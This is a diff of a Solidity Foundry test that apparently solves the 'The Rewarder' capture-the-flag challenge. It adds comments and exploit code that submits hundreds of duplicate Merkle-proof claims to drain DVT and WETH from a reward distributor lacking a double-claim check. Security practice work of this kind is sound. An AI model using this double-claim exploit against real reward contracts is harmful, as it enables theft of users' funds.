@@ -148,7 +148,11 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        // Create Alice's claims
+        // Exploit: We can claim multiple times as there is no check to see if a user has already claimed for a specific token in a specific batch.
+        // We can use this to drain the distributor by claiming multiple times for both DVT and WETH.
+        // We prepare multiple claims for both tokens and then we call the claimRewards function twice, once for each token.
+        // Finally we transfer all the tokens to the recovery address. 
+
         uint times = 867;
         uint times2 = 853;
         Claim[] memory claims = new Claim[](times);
@@ -160,58 +164,55 @@ contract TheRewarderChallenge is Test {
         tokensToClaim[1] = IERC20(address(weth));
 
 
+        // Load rewards files and find index and amount to claim for player address
         bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
         Reward[] memory dvtRewards = abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), "/test/the-rewarder/dvt-distribution.json"))), (Reward[]));
-
 
         bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
         Reward[] memory wethRewards = abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), "/test/the-rewarder/weth-distribution.json"))), (Reward[]));
 
 
-
+        // Find index and amount to claim for player address
         uint256 indexDVT = findMyIndex(dvtRewards, player);
         uint256 indexWETH = findMyIndex(wethRewards, player);
 
+        // Get amount to claim for player address
         uint256 amountToClaimDVT = dvtRewards[indexDVT].amount;
         uint256 amountToClaimWETH = wethRewards[indexWETH].amount;
 
-        
-        // console.log(address(player));
-        console.log("Before", weth.balanceOf(player));
-        console.log("Before", dvt.balanceOf(player));
-        // DVT claim
 
 
         bytes32[] memory proof = merkle.getProof(dvtLeaves, indexDVT);
         bytes32[] memory proof2 = merkle.getProof(wethLeaves, indexWETH);
 
 
+        // Prepare claims
         for (uint i = 0; i < times; i++) {
+            // DVT claim
              claims[i] = Claim({
                 batchNumber: 0, // claim corresponds to first DVT batch
                 amount: amountToClaimDVT,
                 tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
                 proof: proof // Alice's address is at index 2
             });
-        }
-       
-        for (uint i = 0; i < times2; i++) {
-             // WETH claim
+
+            if (i < times2) {
+                // WETH claim
                 claims2[i] = Claim({
                     batchNumber: 0, // claim corresponds to first WETH batch
                     amount: amountToClaimWETH,
                     tokenIndex: 1, // claim corresponds to second token in `tokensToClaim` array
                     proof: proof2 // Alice's address is at index 2
                 });
+            }
         }
-
+       
+        // Player claims multiple times
         distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
         distributor.claimRewards({inputClaims: claims2, inputTokens: tokensToClaim});
 
 
-        console.log("After", weth.balanceOf(player));
-        console.log("After", dvt.balanceOf(player));
-
+        // Transfer all tokens to recovery address
         dvt.transfer(recovery, dvt.balanceOf(player));
         weth.transfer(recovery, weth.balanceOf(player));
 
